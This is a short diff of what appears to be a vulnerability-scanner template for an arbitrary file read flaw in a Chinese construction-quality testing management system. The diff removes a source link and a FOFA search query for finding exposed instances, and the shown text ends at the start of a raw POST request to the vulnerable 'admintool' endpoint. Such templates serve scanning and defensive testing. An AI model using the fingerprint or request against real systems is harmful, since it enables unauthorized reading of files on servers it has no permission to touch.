@@ -3,12 +3,8 @@ info:
   name: 建研建设工程质量检测信息管理系统 admintool 存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pninril1ea28fqbs'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pninril1ea28fqbs
-    fofa: (body="/Content/Theme/Standard/webSite/login.css" && body="/Content/Theme/Standard/webSite/images/bg.jpg") || body="Login/QRLogin.ashx"
 http:
 - raw:
   - 'POST /Scripts/admintool?type=file HTTP/1.1
